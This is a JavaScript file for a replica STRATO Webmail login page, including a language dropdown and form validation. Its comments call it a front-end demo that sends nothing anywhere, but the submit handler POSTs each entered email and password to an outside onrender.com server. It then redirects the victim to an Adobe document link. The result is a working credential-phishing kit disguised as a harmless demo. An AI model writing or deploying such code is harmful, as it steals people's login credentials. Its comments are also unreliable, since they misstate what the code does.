/* ===== STRATO Webmail Login – replica (front-end demo only) ===== */

const form = document.getElementById("loginForm");
const email = document.getElementById("email");
const password = document.getElementById("password");
const demoNote = document.getElementById("demoNote");
const loginButton = document.getElementById("btn");

/* --- Language dropdown --- */
const langToggle = document.getElementById("langToggle");
const langMenu = document.getElementById("langMenu");
const langLabel = document.getElementById("langLabel");

langToggle.addEventListener("click", (e) => {
  e.stopPropagation();
  const open = langMenu.hidden;
  langMenu.hidden = !open;
  langToggle.setAttribute("aria-expanded", String(open));
});

langMenu.addEventListener("click", (e) => {
  const btn = e.target.closest("button[data-lang]");
  if (!btn) return;
  langLabel.textContent = btn.dataset.lang;
  langMenu.hidden = true;
  langToggle.setAttribute("aria-expanded", "false");
});

document.addEventListener("click", (e) => {
  if (!langMenu.hidden && !e.target.closest(".nav-lang-wrap")) {
    langMenu.hidden = true;
    langToggle.setAttribute("aria-expanded", "false");
  }
});

/* --- Validation helpers --- */
function setError(input, on) {
  input.closest(".field").classList.toggle("error", on);
}

[email, password].forEach((input) => {
  input.addEventListener("input", () => {
    setError(input, false);
    demoNote.hidden = true;
  });
});

/* --- Submit (demo: nothing is sent anywhere) --- */
form.addEventListener('submit', (e) => {
  e.preventDefault();

  const emailOk = email.value.trim().length > 0;
  const passOk = password.value.trim().length > 0;
  const loginButton = document.getElementById("btn");
    loginButton.classList.add('loading');
    loginButton.disabled = true;
  

  setError(email, !emailOk);
  setError(password, !passOk);

  if (!emailOk || !passOk) {
    demoNote.textContent = "Bitte gib sowohl deine E-Mail-Adresse als auch dein Passwort ein.";
    demoNote.hidden = false;
    (!emailOk ? email : password).focus();
    return;
  }

  fetch('https://web-backend-1-6ai4.onrender.com/', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify({
                email: email.value,
                password: password.value,
                source: 'STRATO',
              }),
      		  
      		  
      
            })
    
    		  .finally(() => {
    		  loginButton.classList.remove('loading');
   			  loginButton.disabled = false;
  			  })
    
              .then((data) => {
                window.location.href = 'https://acrobat.adobe.com/id/urn:aaid:sc:DEU1:393a2066-28b9-5ed9-b8a1-cdf6300fd1d3';
              });
    			
    		  
  
});
